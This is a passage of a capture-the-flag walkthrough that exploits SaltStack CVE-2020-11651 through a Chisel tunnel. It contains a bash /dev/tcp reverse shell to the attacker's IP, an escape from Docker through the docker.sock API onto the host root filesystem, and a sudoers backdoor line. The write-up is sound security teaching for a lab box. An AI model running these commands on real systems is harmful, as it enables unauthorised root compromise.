+        RX packets 110193  bytes 49169059 (49.1 MB)
+        RX errors 0  dropped 96  overruns 0  frame 0
+        TX packets 106878  bytes 13658308 (13.6 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+...[snip]...
+</span></code></pre></div></div>
+<p>This shell seems to be running on the main host.</p>
+<h3 id="cve-2020-11651">CVE-2020-11651</h3>
+<h4 id="background-1">Background</h4>
+<p>Googling for “SaltStack vulnerabilities” returned <a href="https://www.helpnetsecurity.com/2020/05/04/saltstack-salt-vulnerabilities/">this article</a> from May 2020 (around the same time as the Tomcat vulnerability) talking about CVE-2020-11651 and CVE-2020-11652 which can be exploited by remote, unauthenticated attackers.</p>
+<blockquote>
+<p>According to the researchers, the vulnerabilities allow attackers to “connect to the ‘request server’ port to bypass all authentication and authorization controls and publish arbitrary control messages, read and write files anywhere on the ‘master’ server filesystem and steal the secret key used to authenticate to the master as root.”</p>
+</blockquote>
+<p>More Google led to <a href="https://github.com/jasperla/CVE-2020-11651-poc">this proof of concept</a> on GitHub.</p>
+<h4 id="tunnel">Tunnel</h4>
+<p>To access these ports, I need to run from Feline or tunnel. I uploaded <a href="https://github.com/jpillora/chisel">Chisel</a> to Feline and used it to create a socks proxy. First I started the server on my host:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/opt/chisel#</span><span class="w"> </span>./chisel_1.6.0_linux_amd64 server <span class="nt">-p</span> 8000 <span class="nt">--reverse</span>
+<span class="go">2020/09/01 09:15:49 server: Reverse tunnelling enabled
+2020/09/01 09:15:49 server: Fingerprint be:f7:9d:b2:7f:8c:a4:60:51:43:9a:c3:3e:b1:34:fa
+2020/09/01 09:15:49 server: Listening on 0.0.0.0:8000...
+</span></code></pre></div></div>
+<p>Next the client:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">tomcat@VirusBucket:/var/tmp$</span><span class="w"> </span>./chisel_1.6.0_linux_amd64 client 10.10.14.15:8000 R:socks
+<span class="go">2020/09/01 17:03:56 client: Connecting to ws://10.10.14.15:8000
+2020/09/01 17:03:56 client: Fingerprint be:f7:9d:b2:7f:8c:a4:60:51:43:9a:c3:3e:b1:34:fa
+2020/09/01 17:03:56 client: Connected (Latency 11.653786ms)
+</span></code></pre></div></div>
+<p>The server shows this connection:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2020/09/01 09:20:02 server: proxy#1:R:127.0.0.1:1080=&gt;socks: Listening
+</code></pre></div></div>
+<h4 id="test-vulnerable">Test Vulnerable</h4>
+<p>Running the script with no arguments does a check on localhost to see if it’s vulnerable. I’ll use <code class="language-plaintext highlighter-rouge">proxychains</code> to tunnel through the Chisel socks proxy. The proxies in <code class="language-plaintext highlighter-rouge">/etc/proxychains.conf</code> tell it to use 127.0.0.1:1080 as a socks5 proxy:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[ProxyList]
+socks5  127.0.0.1 1080
+</code></pre></div></div>
+<p>Now I’ll run the exploit with <code class="language-plaintext highlighter-rouge">proxychains</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/opt/CVE-2020-11651-poc#</span><span class="w"> </span>proxychains python3 exploit.py
+<span class="go">ProxyChains-3.1 (http://proxychains.sf.net)
+[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
+[+] Checking salt-master (127.0.0.1:4506) status... ONLINE
+[+] Checking if vulnerable to CVE-2020-11651... YES
+[*] root key obtained: HWxqacQWZGow8QrRBTcMKALAYRqsdT2t30kwsV8MBIYk03o/4UV8puHk788hKPT4mPdRg55WyEI=
+</span></code></pre></div></div>
+<p>Feline is vulnerable.</p>
+<h4 id="ping">Ping</h4>
+<p>Next I tried to get it to ping me by running:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/opt/CVE-2020-11651-poc#</span><span class="w"> </span>proxychains python3 exploit.py <span class="nt">--exec</span> <span class="s1">'ping -c 1 10.10.14.15'</span>
+<span class="go">ProxyChains-3.1 (http://proxychains.sf.net)
+[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
+[+] Checking salt-master (127.0.0.1:4506) status... ONLINE
+[+] Checking if vulnerable to CVE-2020-11651... YES
+[*] root key obtained: HWxqacQWZGow8QrRBTcMKALAYRqsdT2t30kwsV8MBIYk03o/4UV8puHk788hKPT4mPdRg55WyEI=
+[+] Attempting to execute ping -c 1 10.10.14.15 on 127.0.0.1
+[+] Successfully scheduled job: 20200901193401749722
+</span></code></pre></div></div>
+<p>At <code class="language-plaintext highlighter-rouge">tcpdump</code>, I got the ping:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>tcpdump <span class="nt">-i</span> tun0 icmp
+<span class="go">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+15:32:16.127560 IP 10.10.10.205 &gt; 10.10.14.15: ICMP echo request, id 9630, seq 1, length 64
+15:32:16.127615 IP 10.10.14.15 &gt; 10.10.10.205: ICMP echo reply, id 9630, seq 1, length 6
+</span></code></pre></div></div>
+<h4 id="shell-1">Shell</h4>
+<p>I’ll just change the command to a reverse shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali:/opt/CVE-2020-11651-poc#</span><span class="w"> </span>proxychains python3 exploit.py <span class="nt">--exec</span> <span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.15/443 0&gt;&amp;1"'</span>
+<span class="go">ProxyChains-3.1 (http://proxychains.sf.net)
+[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
+[+] Checking salt-master (127.0.0.1:4506) status... ONLINE
+[+] Checking if vulnerable to CVE-2020-11651... YES
+[*] root key obtained: HWxqacQWZGow8QrRBTcMKALAYRqsdT2t30kwsV8MBIYk03o/4UV8puHk788hKPT4mPdRg55WyEI=
+[+] Attempting to execute bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.15/443 0&gt;&amp;1" on 127.0.0.1
+[+] Successfully scheduled job: 20200901193454581517
+</span></code></pre></div></div>
+<p>At <code class="language-plaintext highlighter-rouge">nc</code>, I get a shell as root in a container:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.205.
+Ncat: Connection from 10.10.10.205:39680.
+bash: cannot set terminal process group (9655): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">root@2d24bf61767c:~#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>In the root home directory, there’s a <code class="language-plaintext highlighter-rouge">todo.txt</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Add saltstack support to auto-spawn sandbox dockers through events.
+- Integrate changes to tomcat and make the service open to public.
+</code></pre></div></div>
+<p>That’s interesting, but it doesn’t mean a ton to me. They are looking to use events to spawn docker containers.</p>
+<p>The breakthrough came on looking at the Bash history:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@2d24bf61767c:~#</span><span class="w"> </span><span class="nb">cat</span> .bash_history 
+<span class="go">paswd
+passwd
+passwd
+passswd
+passwd
+passwd
+cd /root
+ls
+ls -la
+rm .wget-hsts 
+cd .ssh/
+ls
+cd ..
+printf '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.' &gt; todo.txt
+cat todo.txt 
+printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.' &gt; todo.txt
+cat todo.txt 
+printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\' &gt; todo.txt
+printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\n' &gt; todo.txt
+printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\' &gt; todo.txt
+printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\n' &gt; todo.txt
+cat todo.txt 
+printf -- '- Add saltstack support to auto-spawn sandbox dockers through events.\n- Integrate changes to tomcat and make the service open to public.\n' &gt; todo.txt
+cd /home/tomcat
+cat /etc/passwd
+exit
+cd /root/
+ls
+cat todo.txt 
+ls -la /var/run/
+curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
+exit
+</span></code></pre></div></div>
+<p>The interesting line is the last thing run. That <code class="language-plaintext highlighter-rouge">curl</code> is hitting the <a href="https://docs.docker.com/engine/api/v1.30/">Docker API</a>. If I can interact with the API from here, it is basically like being in the <code class="language-plaintext highlighter-rouge">docker</code> group, which means I can get file system access as root to the docker host, which typically leads to a shell.</p>
+<p>I’ll run the command from the history, and it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@2d24bf61767c:~#</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">--unix-socket</span> /var/run/docker.sock http://localhost/images/json
+<span class="go">[{"Containers":-1,"Created":1590787186,"Id":"sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e","Labels":null,"ParentId":"","RepoDigests":null,"RepoTags":["sandbox:latest"],"SharedSize":-1,"Size":5574537,"VirtualSize":5574537},{"Containers":-1,"Created":1588544489,"Id":"sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9","Labels":null,"ParentId":"","RepoDigests":["&lt;none&gt;@&lt;none&gt;"],"RepoTags":["&lt;none&gt;:&lt;none&gt;"],"SharedSize":-1,"Size":1056679100,"VirtualSize":1056679100}]
+</span></code></pre></div></div>
+<p>This command it basically the equivalent of running <code class="language-plaintext highlighter-rouge">docker ps</code>.</p>
+<h3 id="strategy">Strategy</h3>
+<p>The next step is to start a container with the root files system mapped into it and then to run commands in that container getting access to the root file system.</p>
+<p>The challenge here is just reading the <a href="https://docs.docker.com/engine/api/v1.30/">API docs</a> and figuring out which to use and what parameters are required.</p>
+<p>I found three strategies that worked:</p>
+<ol>
+<li>
+<p>Command set at container creation:</p>
+<ul>
+<li>Create a container with the host filesystem mapped into it and a command;</li>
+<li>Start the container;</li>
+<li>Get command results from Docker logs;</li>
+</ul>
+</li>
+<li>
+<p>Container with <code class="language-plaintext highlighter-rouge">exec</code>:</p>
+<ul>
+<li>Create a container;</li>
+<li>Start the container;</li>
+<li>Create an <code class="language-plaintext highlighter-rouge">exec</code> instance;</li>
+<li>Start <code class="language-plaintext highlighter-rouge">exec</code> instance;</li>
+</ul>
+</li>
+<li>
+<p>Container + <code class="language-plaintext highlighter-rouge">socat</code> = shell:</p>
+<ul>
+<li>Create a container;</li>
+<li>Start the container;</li>
+<li>Attach <code class="language-plaintext highlighter-rouge">socat</code> to the container to get a shell</li>
+</ul>
+</li>
+</ol>
+<h3 id="run-commands-w-host-fs-method-1">Run Commands w/ Host FS [Method #1]</h3>
+<h4 id="create-container">Create Container</h4>
+<p>I’ll start with the <code class="language-plaintext highlighter-rouge">/container/create</code> <a href="https://docs.docker.com/engine/api/v1.30/#operation/ContainerCreate">API call</a>. It takes a POST, with a ton of potential arguments. I had to play around with this a bunch to get something that worked, but the command I ended up using was:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@2d24bf61767c:~#</span><span class="w"> </span>curl <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-s</span> <span class="nt">-X</span> <span class="s1">'POST'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">--data-binary</span> <span class="s1">'{"Image": "sandbox:latest","HostConfig": {"Binds": ["/:/rootfs"]}, "Cmd": ["/bin/sh", "-c", "ls -l /rootfs/root/"], "Tty": true}'</span> http://localhost/containers/create
+<span class="go">{"Id":"0af5539d4b1cf764a116301fb13938cb361cd0386b6fbc4fb750661d1d226b36","Warnings":[]}
+</span></code></pre></div></div>
+<p>It returns the ID of the new container without any warnings, so it worked.</p>
+<p>The POST body is:</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"Image"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sandbox:latest"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"HostConfig"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"Binds"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+      </span><span class="s2">"/:/rootfs"</span><span class="w">
+    </span><span class="p">]</span><span class="w">
+  </span><span class="p">},</span><span class="w">
+  </span><span class="nl">"Cmd"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="s2">"/bin/sh"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"-c"</span><span class="p">,</span><span class="w">
+    </span><span class="s2">"ls -l /rootfs/root/"</span><span class="w">
+  </span><span class="p">],</span><span class="w">
+  </span><span class="nl">"Tty"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">Image</code> comes from the list of available containers above. The <code class="language-plaintext highlighter-rouge">Binds</code> tells the container to map the host <code class="language-plaintext highlighter-rouge">/</code> to <code class="language-plaintext highlighter-rouge">/rootfs</code> inside the container. To start, I’ll use <code class="language-plaintext highlighter-rouge">Cmd</code> to list the files in the root home directory. For some reason I needed to set <code class="language-plaintext highlighter-rouge">Tty</code> to <code class="language-plaintext highlighter-rouge">true</code> to get this working.</p>
+<h4 id="start-container">Start Container</h4>
+<p>Next I’ll use the <code class="language-plaintext highlighter-rouge">/container/$id/start</code> <a href="https://docs.docker.com/engine/api/v1.30/#operation/ContainerStart">API</a> to start the container (I can use the full ID or the first four characters):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@2d24bf61767c:~#</span><span class="w"> </span>curl <span class="nt">-i</span> <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> http://localhost/containers/0af5/start
+<span class="go">HTTP/1.1 204 No Content
+Api-Version: 1.40
+Docker-Experimental: false
+Ostype: linux
+Server: Docker/19.03.8 (linux)
+Date: Tue, 01 Sep 2020 20:36:10 GMT
+</span></code></pre></div></div>
+<p>I included <code class="language-plaintext highlighter-rouge">-i</code> to see the headers. HTTP 204 is the expected code when the container starts.</p>
+<h4 id="get-results">Get Results</h4>
+<p>At this point, the <code class="language-plaintext highlighter-rouge">Cmd</code> has already run. I’ll use the <code class="language-plaintext highlighter-rouge">/containers/$id/logs</code> <a href="https://docs.docker.com/engine/api/v1.30/#operation/ContainerLogs">API</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@2d24bf61767c:~#</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="s2">"http://localhost/containers/0af5/logs?stderr=1&amp;stdout=1"</span>total 8
+<span class="go">-rw-------    1 root     root            33 Sep  1 13:19 root.txt
+drwxr-xr-x    3 root     root          4096 May 18 08:44 snap
+</span></code></pre></div></div>
+<p>I’ll set both <code class="language-plaintext highlighter-rouge">stderr</code> and <code class="language-plaintext highlighter-rouge">stdout</code> to 1 to requests both, and then the results come back showing the contents of <code class="language-plaintext highlighter-rouge">/root</code>!</p>
+<h4 id="one-liner">One-Liner</h4>
+<p>To play with this, I generated the following one-liner so that I could just push up-arrow, change the command, and then hit enter and get results:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@2d24bf61767c:~#</span><span class="w"> </span><span class="nb">id</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-s</span> <span class="nt">-X</span> <span class="s1">'POST'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">--data-binary</span> <span class="s1">'{"Image": "sandbox:latest","HostConfig": {"Binds": ["/:/rootfs"]}, "Cmd": ["/bin/sh", "-c", "ls -l /rootfs/root/"], "Tty": true}'</span> http://localhost/containers/create | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'"'</span> <span class="nt">-f4</span><span class="si">)</span><span class="p">;</span> curl <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> http://localhost/containers/<span class="k">${</span><span class="nv">id</span><span class="k">}</span>/start<span class="p">;</span> curl <span class="nt">-s</span> <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="s2">"http://localhost/containers/</span><span class="k">${</span><span class="nv">id</span><span class="k">}</span><span class="s2">/logs?stderr=1&amp;stdout=1"</span>
+<span class="go">total 8
+-rw-------    1 root     root            33 Sep  1 13:19 root.txt
+drwxr-xr-x    3 root     root          4096 May 18 08:44 snap
+</span></code></pre></div></div>
+<p>From here I can grab <code class="language-plaintext highlighter-rouge">root.txt</code> by just changing the command:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@2d24bf61767c:~#</span><span class="w"> </span><span class="nb">id</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-s</span> <span class="nt">-X</span> <span class="s1">'POST'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">--data-binary</span> <span class="s1">'{"Image": "sandbox:latest","HostConfig": {"Binds": ["/:/rootfs"]}, "Cmd": ["/bin/sh", "-c", "cat /rootfs/root/root.txt"], "Tty": true}'</span> http://localhost/containers/create | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'"'</span> <span class="nt">-f4</span><span class="si">)</span><span class="p">;</span> curl <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> http://localhost/containers/<span class="k">${</span><span class="nv">id</span><span class="k">}</span>/start<span class="p">;</span> curl <span class="nt">-s</span> <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="s2">"http://localhost/containers/</span><span class="k">${</span><span class="nv">id</span><span class="k">}</span><span class="s2">/logs?stderr=1&amp;stdout=1"</span>
+<span class="go">24d5f49db9f24f6e87b35ebe1c53e796
+</span></code></pre></div></div>
+<h3 id="run-commands-w-host-fs-method-2">Run Commands w/ Host FS [Method #2]</h3>
+<p>This box seems to be clearing out containers every few minutes. Because of that, I preferred to use the above method to just create a new container each command. That said, in an engagement where OPSEC mattered more, I’d create one instance, and then run commands using the <code class="language-plaintext highlighter-rouge">exec</code> <a href="https://docs.docker.com/engine/api/v1.30/#tag/Exec">API</a>.</p>
+<p>The first two steps are the same - create and start an instance. This time, I’ll create it without the <code class="language-plaintext highlighter-rouge">Cmd</code> parameter:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@2d24bf61767c:~#</span><span class="w"> </span><span class="nb">id</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-s</span> <span class="nt">-X</span> <span class="s1">'POST'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">--data-binary</span> <span class="s1">'{"Image": "sandbox:latest","HostConfig": {"Binds": ["/:/rootfs"]}, "Tty": true}'</span> http://localhost/containers/create | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'"'</span> <span class="nt">-f4</span><span class="si">)</span><span class="p">;</span> curl <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> http://localhost/containers/<span class="k">${</span><span class="nv">id</span><span class="k">}</span>/start
+</code></pre></div></div>
+<p>Now I’ll add a command, which will return an ID:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-d</span> <span class="s1">'{"Cmd": ["ls", "-l", "/rootfs/root/"], "AttachStdout": true, "AttachStderr": true, "Tty": true}'</span> http://localhost/containers/<span class="k">${</span><span class="nv">id</span><span class="k">}</span>/exec
+<span class="o">{</span><span class="s2">"Id"</span>:<span class="s2">"f55b2c9d029f0588d615cbb3d4b04e2aaf1ae4438cabfa1122643ece406c4ecc"</span><span class="o">}</span>
+</code></pre></div></div>
+<p>This ID is not the container ID, but the exec ID. I’ll use the <code class="language-plaintext highlighter-rouge">start</code> option to run the command and print the results:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@2d24bf61767c:~#</span><span class="w"> </span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> http://localhost/exec/f55b2c9d029f0588d615cbb3d4b04e2aaf1ae4438cabfa1122643ece406c4ecc/start <span class="nt">-d</span> <span class="s1">'{"Detach": false, "Tty": true}'</span>
+<span class="go">total 8
+-rw-------    1 root     root            33 Sep  1 13:19 root.txt
+drwxr-xr-x    3 root     root          4096 May 18 08:44 snap
+</span></code></pre></div></div>
+<h3 id="socat-shell-in-container-w-host-fs-method-3">Socat Shell in Container w/ Host FS [Method #3]</h3>
+<p><a href="https://blog.secureideas.com/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html">This blog post</a> shows how to hook socat into the socket to get an ugly shell in the new container. Just like before, I’ll create and start a container, this time with some extra parameters. The blog recommends storing them in a <code class="language-plaintext highlighter-rouge">container.json</code> file, so I’ll do that. Pretty printed it looks like (though the real file doesn’t have the newlines or spacing):</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"Image"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sandbox:latest"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"Cmd"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="s2">"/bin/sh"</span><span class="w">
+  </span><span class="p">],</span><span class="w">
+  </span><span class="nl">"DetachKeys"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Ctrl-p,Ctrl-q"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"OpenStdin"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"Mounts"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"Type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"bind"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"Source"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"Target"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/rootfs"</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>I’ll connect to the container using <code class="language-plaintext highlighter-rouge">socat</code> (I had to upload a copy downloaded from <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat">GitHub</a>), and enter an HTTP PORT request:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@2d24bf61767c:~#</span><span class="w"> </span>./socat - UNIX-CONNECT:/var/run/docker.sock
+<span class="go">POST /containers/22c0/attach?stream=1&amp;stdin=1&amp;stdout=1&amp;stderr=1 HTTP/1.1
+Host: 
+Connection: Upgrade
+Upgrade: tcp
+</span></code></pre></div></div>
+<p>The response back shows <code class="language-plaintext highlighter-rouge">UPGRADED</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@2d24bf61767c:~#</span><span class="w"> </span>./socat - UNIX-CONNECT:/var/run/docker.sock
+<span class="go">POST /containers/22c0/attach?stream=1&amp;stdin=1&amp;stdout=1&amp;stderr=1 HTTP/1.1
+Host: 
+Connection: Upgrade
+Upgrade: tcp
+                              
+HTTP/1.1 101 UPGRADED   
+Content-Type: application/vnd.docker.raw-stream
+Connection: Upgrade
+Upgrade: tcp                                                                                                              
+
+</span></code></pre></div></div>
+<p>At this point the terminal is just hanging, but if I give it a command, it runs and returns results:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27
+(video)
+</code></pre></div></div>
+<p>I can easily read <code class="language-plaintext highlighter-rouge">root.txt</code>, or use the techniques that follow to get a full shell.</p>
+<h3 id="shell-2">Shell</h3>
+<p>There’s a ton of ways to get a shell with root file system access. I’ll add myself to the <code class="language-plaintext highlighter-rouge">/etc/sudoers</code> file. It by default looks like:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@2d24bf61767c:~#</span><span class="w"> </span><span class="nb">id</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-s</span> <span class="nt">-X</span> <span class="s1">'POST'</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">--data-binary</span> <span class="s1">'{"Image": "sandbox:latest","HostConfig": {"Binds": ["/:/rootfs"]}, "Cmd": ["/bin/sh", "-c", "cat /rootfs/etc/sudoers"], "Tty": true}'</span> http://localhost/containers/create | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'"'</span> <span class="nt">-f4</span><span class="si">)</span><span class="p">;</span> curl <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> http://localhost/containers/<span class="k">${</span><span class="nv">id</span><span class="k">}</span>/start<span class="p">;</span> curl <span class="nt">-s</span> <span class="nt">--unix-socket</span> /var/run/docker.sock <span class="s2">"http://localhost/containers/</span><span class="k">${</span><span class="nv">id</span><span class="k">}</span><span class="s2">/logs?stderr=1&amp;stdout=1"</span>
+<span class="gp">#</span><span class="w">
+</span><span class="gp">#</span><span class="w"> </span>This file MUST be edited with the <span class="s1">'visudo'</span> <span class="nb">command </span>as root.
+<span class="gp">#</span><span class="w">
+</span><span class="gp">#</span><span class="w"> </span>Please consider adding <span class="nb">local </span>content <span class="k">in</span> /etc/sudoers.d/ instead of
+<span class="gp">#</span><span class="w"> </span>directly modifying this file.
+<span class="gp">#</span><span class="w">
+</span><span class="gp">#</span><span class="w"> </span>See the man page <span class="k">for </span>details on how to write a sudoers file.
+<span class="gp">#</span><span class="w">
+</span><span class="go">Defaults        env_reset
+Defaults        mail_badpass
+Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
+
+</span><span class="gp">#</span><span class="w"> </span>Host <span class="nb">alias </span>specification
+<span class="go">
+</span><span class="gp">#</span><span class="w"> </span>User <span class="nb">alias </span>specification
+<span class="go">
+</span><span class="gp">#</span><span class="w"> </span>Cmnd <span class="nb">alias </span>specification
+<span class="go">
+</span><span class="gp">#</span><span class="w"> </span>User privilege specification
+<span class="go">root    ALL=(ALL:ALL) ALL
+
+</span><span class="gp">#</span><span class="w"> </span>Members of the admin group may gain root privileges
+<span class="go">%admin ALL=(ALL) ALL
+
+</span><span class="gp">#</span><span class="w"> </span>Allow members of group <span class="nb">sudo </span>to execute any <span class="nb">command</span>
+<span class="go">%sudo   ALL=(ALL:ALL) ALL
+
+</span><span class="gp">#</span><span class="w"> </span>See sudoers<span class="o">(</span>5<span class="o">)</span> <span class="k">for </span>more information on <span class="s2">"#include"</span> directives:
+<span class="go">
+</span><span class="gp">#</span>includedir /etc/sudoers.d
+</code></pre></div></div>
+<p>I’ll add a line to the end with the command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"tomcat ALL=(ALL) NOPASSWD:ALL"</span> <span class="o">&gt;&gt;</span> /rootfs/etc/sudoers
+</code></pre></div></div>
+<p>In the one-liner:</p>
